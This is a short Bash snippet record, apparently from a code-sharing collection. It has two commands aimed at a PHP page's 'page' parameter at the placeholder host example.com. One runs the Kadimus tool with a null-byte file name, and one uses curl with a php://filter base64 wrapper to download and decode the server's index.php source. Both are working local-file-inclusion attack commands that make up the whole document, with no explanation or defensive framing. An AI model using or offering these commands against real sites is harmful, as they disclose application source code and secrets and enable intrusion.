---
id: b426d2c3-c7da-4ed3-b41d-7b12160e05f5
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:58.322529+00:00'
updated_at: '2023-04-10T20:22:19.778116+00:00'
---

# Code Snippet b426d2c3

**Language**: Bash

```bash
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```


